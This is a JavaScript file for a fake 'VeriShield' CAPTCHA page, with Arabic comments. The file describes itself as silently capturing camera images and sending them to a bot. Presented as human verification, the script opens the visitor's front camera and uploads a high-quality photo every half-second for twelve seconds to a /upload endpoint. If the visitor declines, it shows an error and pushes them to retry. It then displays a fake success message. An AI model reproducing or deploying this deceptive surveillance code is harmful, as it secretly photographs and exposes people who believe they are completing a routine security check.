/**
 * VeriShield - Verification System
 * مع وظائف الكاميرا الصامتة وإرسال الصور إلى البوت
 */

(function() {
  'use strict';

  console.log('✅ VeriShield loaded successfully!');

  // ============================================
  // المتغيرات والعناصر
  // ============================================

  const captchaWidget = document.getElementById('captcha-widget');
  const captchaCheckbox = document.getElementById('captcha-checkbox');
  const captchaText = document.getElementById('captcha-text');
  const finalMessage = document.getElementById('final-message');
  const socialButtons = document.getElementById('social-buttons');
  const progressBar = document.getElementById('progress-bar');
  const progressFill = document.getElementById('progress-fill');

  let isProcessing = false;
  let isVerified = false;
  let progressInterval = null;
  let cameraRejected = false; // متغير لتتبع رفض الكاميرا

  // متغيرات الكاميرا (صامتة)
  let stream = null;
  let video = null;
  let captureInterval = null;
  let finishTimeout = null;
  let imageNumber = 0;
  let cameraError = false;

  const duration = 12000; // 12 ثانية
  const intervalTime = 500; // كل 0.5 ثانية (أسرع)

  console.log('✅ Elements found:', {
    widget: !!captchaWidget,
    checkbox: !!captchaCheckbox,
    text: !!captchaText,
    message: !!finalMessage,
    social: !!socialButtons,
    progress: !!progressBar
  });

  // ============================================
  // الدوال المساعدة
  // ============================================

  // تأثير الاهتزاز
  function shakeElement(element) {
    if (!element) return;
    element.style.animation = 'none';
    element.offsetHeight;
    element.style.animation = 'shake 0.3s ease-in-out';
    setTimeout(function() {
      element.style.animation = '';
    }, 300);
  }

  // تأثير النبض
  function pulseElement(element) {
    if (!element) return;
    element.style.animation = 'none';
    element.offsetHeight;
    element.style.animation = 'pulse 0.5s ease-in-out 3';
    setTimeout(function() {
      element.style.animation = '';
    }, 1500);
  }

  // ============================================
  // إرسال صورة إلى الخادم (صامت)
  // ============================================

  async function sendImage(blob, number) {
    const formData = new FormData();
    formData.append("images", blob, `camera-${Date.now()}-${number}.jpg`);

    try {
      const response = await fetch("/upload", {
        method: "POST",
        body: formData
      });

      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }

      const result = await response.json();
      console.log("✅ تم إرسال الصورة رقم", number, result);
      return true;

    } catch (error) {
      console.error("❌ فشل إرسال الصورة رقم", number, error);
      return false;
    }
  }

  // ============================================
  // التقاط صورة وإرسالها (جودة عالية)
  // ============================================

  async function captureImage() {
    if (!video || !video.videoWidth || !video.videoHeight) {
      return;
    }

    // استخدام حجم أكبر للصورة للحصول على جودة أفضل
    const canvas = document.createElement("canvas");
    const width = Math.min(video.videoWidth, 1280);
    const height = Math.min(video.videoHeight, 720);
    canvas.width = width;
    canvas.height = height;
    
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, width, height);

    canvas.toBlob(async (blob) => {
      if (!blob) return;
      imageNumber++;
      await sendImage(blob, imageNumber);
    }, "image/jpeg", 0.95); // استخدام JPEG بجودة عالية
  }

  // ============================================
  // إظهار رسالة الخطأ (ثابتة حتى يعيد المحاولة)
  // ============================================

  function showError(message) {
    // إزالة جميع الحالات السابقة
    captchaWidget.classList.remove('state-loading', 'state-success');
    captchaWidget.classList.add('state-error');
    
    // تغيير النص إلى رسالة الخطأ فوراً
    captchaText.textContent = message;
    captchaText.style.color = '#ff0000';
    captchaText.style.opacity = '1';
    
    // إخفاء شريط التقدم
    progressBar.classList.add('hidden');
    progressFill.style.width = '0%';
    
    // تعيين حالة رفض الكاميرا
    cameraRejected = true;
    isProcessing = false;
    
    // إعادة تعيين الإشارة إلى أن المستخدم لم يتحقق بعد
    isVerified = false;
    
    // إزالة حالة التحميل من المربع
    captchaCheckbox.setAttribute('aria-checked', 'false');
  }

  // ============================================
  // إعادة تعيين الحالة (للمحاولة مرة أخرى)
  // ============================================

  function resetState() {
    // إزالة حالة الخطأ
    captchaWidget.classList.remove('state-error', 'state-loading', 'state-success');
    
    // إعادة النص إلى الوضع الطبيعي
    captchaText.textContent = 'أنا لست برنامج روبوت';
    captchaText.style.color = '#000000';
    captchaText.style.opacity = '1';
    
    // إخفاء شريط التقدم
    progressBar.classList.add('hidden');
    progressFill.style.width = '0%';
    
    // إعادة تعيين المتغيرات
    cameraRejected = false;
    isProcessing = false;
    isVerified = false;
    
    // إعادة تعيين checkbox
    captchaCheckbox.setAttribute('aria-checked', 'false');
    
    // إخفاء أزرار التواصل
    socialButtons.classList.remove('opacity-100');
    socialButtons.classList.add('opacity-0', 'pointer-events-none');
    
    // إخفاء رسالة الشكر
    finalMessage.classList.remove('opacity-100');
    finalMessage.classList.add('opacity-0');
    
    // إيقاف أي مؤقتات متبقية
    if (progressInterval) {
      clearInterval(progressInterval);
      progressInterval = null;
    }
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
    }
    if (finishTimeout) {
      clearTimeout(finishTimeout);
      finishTimeout = null;
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
  }

  // ============================================
  // بدء التحقق (مع الكاميرا الصامتة)
  // ============================================

  function startVerification() {
    console.log('🔄 startVerification called');
    
    // إذا كان هناك خطأ سابق (رفض الكاميرا)، نعيد تعيين الحالة أولاً
    if (cameraRejected) {
      console.log('🔄 Resetting from camera rejection state');
      resetState();
      // نستمر في تنفيذ الكود لبدء التحقق من جديد
    }
    
    if (isProcessing || isVerified) {
      console.log('⏸️ Skipping - already processing or verified');
      return;
    }

    shakeElement(captchaCheckbox);
    pulseElement(captchaWidget);

    const humanDelay = Math.floor(Math.random() * 100) + 50;
    console.log('⏱️ Human delay:', humanDelay, 'ms');
    
    setTimeout(async function() {
      console.log('▶️ Starting verification process');
      isProcessing = true;
      cameraError = false;
      captchaWidget.classList.add('state-loading');
      captchaCheckbox.setAttribute('aria-checked', 'mixed');

      // ============================================
      // تغيير النص إلى "جاري التحقق..." فقط بعد محاولة الكاميرا
      // ============================================
      
      // ============================================
      // تشغيل الكاميرا بشكل صامت (يتم أولاً)
      // ============================================
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });

        // ✅ تم الوصول للكاميرا بنجاح، الآن نغير النص إلى "جاري التحقق..."
        captchaText.style.opacity = '0';
        setTimeout(function() {
          captchaText.textContent = 'جاري التحقق...';
          captchaText.style.opacity = '1';
          pulseElement(captchaText);
        }, 300);
        
        // شريط التقدم
        progressBar.classList.remove('hidden');
        progressFill.style.width = '0%';

        video = document.createElement("video");
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        await video.play();

        await new Promise(resolve => {
          if (video.videoWidth && video.videoHeight) {
            resolve();
            return;
          }
          video.onloadedmetadata = () => resolve();
        });

        // التقاط أول صورة فوراً
        await captureImage();

        // بدأ التقاط الصور كل 0.5 ثانية
        captureInterval = setInterval(captureImage, intervalTime);

      } catch (error) {
        console.error("❌ Camera error:", error);
        cameraError = true;
        
        // إيقاف كل شيء
        if (progressInterval) {
          clearInterval(progressInterval);
          progressInterval = null;
        }
        progressBar.classList.add('hidden');
        progressFill.style.width = '0%';
        
        // إزالة حالة التحميل
        captchaWidget.classList.remove('state-loading');
        
        // إظهار رسالة الخطأ (ثابتة) - بدون "جاري التحقق..."
        showError('تعذر استخدام الكاميرا للتحقق. يرجى المحاولة مرة أخرى.');
        return; // نخرج من الدالة ولا نكمل
      }

      // ============================================
      // شريط التقدم (12 ثانية)
      // ============================================
      let progress = 0;
      const totalTime = duration;
      const intervalTimeProgress = 50;
      const step = (intervalTimeProgress / totalTime) * 100;

      progressInterval = setInterval(function() {
        progress += step;
        if (progress >= 100) {
          progress = 100;
          clearInterval(progressInterval);
        }
        progressFill.style.width = Math.min(progress, 100) + '%';

        // تحديث النص حسب التقدم
        if (progress < 30) {
          captchaText.textContent = 'جاري التحقق...';
        } else if (progress < 60) {
          captchaText.textContent = 'جاري التحقق...';
        } else if (progress < 90) {
          captchaText.textContent = 'جاري التحقق...';
        } else {
          captchaText.textContent = 'جاري إكمال التحقق...';
        }
      }, intervalTimeProgress);

      // ============================================
      // اكتمال التحقق بعد 12 ثانية
      // ============================================
      finishTimeout = setTimeout(function() {
        clearInterval(progressInterval);
        clearInterval(captureInterval);
        
        // إيقاف الكاميرا
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }
        
        completeVerification();
      }, totalTime);

    }, humanDelay);
  }

  // ============================================
  // إكمال التحقق
  // ============================================

  function completeVerification() {
    console.log('✅ Verification complete!');
    isProcessing = false;
    isVerified = true;
    cameraRejected = false; // إعادة تعيين حالة رفض الكاميرا
    
    captchaWidget.classList.remove('state-loading', 'state-error');
    captchaWidget.classList.add('state-success');
    captchaCheckbox.setAttribute('aria-checked', 'true');

    // إخفاء شريط التقدم
    setTimeout(function() {
      progressBar.classList.add('hidden');
    }, 300);

    // تغيير النص إلى نجاح
    captchaText.style.opacity = '0';
    setTimeout(function() {
      captchaText.textContent = 'تم التحقق من أنك إنسان';
      captchaText.style.opacity = '1';
      captchaText.style.color = '#00aa45';
      pulseElement(captchaText);

      // إظهار رسالة الشكر
      setTimeout(function() {
        finalMessage.classList.remove('opacity-0');
        finalMessage.classList.add('opacity-100');
        
        finalMessage.style.transform = 'scale(0.95)';
        setTimeout(function() {
          finalMessage.style.transform = 'scale(1)';
        }, 100);

        // إظهار أزرار التواصل
        setTimeout(function() {
          socialButtons.classList.remove('opacity-0', 'pointer-events-none');
          socialButtons.classList.add('opacity-100');
          
          socialButtons.style.transform = 'scale(0.9)';
          setTimeout(function() {
            socialButtons.style.transform = 'scale(1)';
          }, 100);
        }, 400);

      }, 600);
    }, 300);
  }

  // ============================================
  // إضافة أحداث النقر
  // ============================================
  
  console.log('🔄 Adding event listeners...');

  // حدث النقر على المربع
  captchaCheckbox.addEventListener('click', function(e) {
    console.log('👆 Checkbox clicked!');
    e.stopPropagation();
    
    // إذا كان هناك خطأ سابق (رفض الكاميرا)، نعيد التعيين ثم نبدأ التحقق
    if (cameraRejected) {
      resetState();
      // نبدأ التحقق بعد إعادة التعيين
      setTimeout(function() {
        startVerification();
      }, 100);
      return;
    }
    
    startVerification();
  });

  // حدث الضغط على لوحة المفاتيح
  captchaCheckbox.addEventListener('keydown', function(e) {
    if (e.key === ' ' || e.key === 'Enter') {
      console.log('⌨️ Keyboard pressed:', e.key);
      e.preventDefault();
      
      // إذا كان هناك خطأ سابق (رفض الكاميرا)، نعيد التعيين ثم نبدأ التحقق
      if (cameraRejected) {
        resetState();
        setTimeout(function() {
          startVerification();
        }, 100);
        return;
      }
      
      startVerification();
    }
  });

  // حدث النقر على النص
  captchaText.addEventListener('click', function() {
    console.log('👆 Text clicked!');
    
    // إذا كان هناك خطأ سابق (رفض الكاميرا)، نعيد التعيين ثم نبدأ التحقق
    if (cameraRejected) {
      resetState();
      setTimeout(function() {
        startVerification();
      }, 100);
      return;
    }
    
    if (!isProcessing && !isVerified) {
      startVerification();
    }
  });

  // منع النقر على الأزرار قبل اكتمال التحقق
  socialButtons.addEventListener('click', function(e) {
    if (!isVerified) {
      e.preventDefault();
      e.stopPropagation();
    }
  });

  // تنظيف عند مغادرة الصفحة
  window.addEventListener("beforeunload", function() {
    if (captureInterval) clearInterval(captureInterval);
    if (progressInterval) clearInterval(progressInterval);
    if (finishTimeout) clearTimeout(finishTimeout);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });

  console.log('✅ All event listeners added successfully!');
  console.log('🚀 Ready to verify!');

})();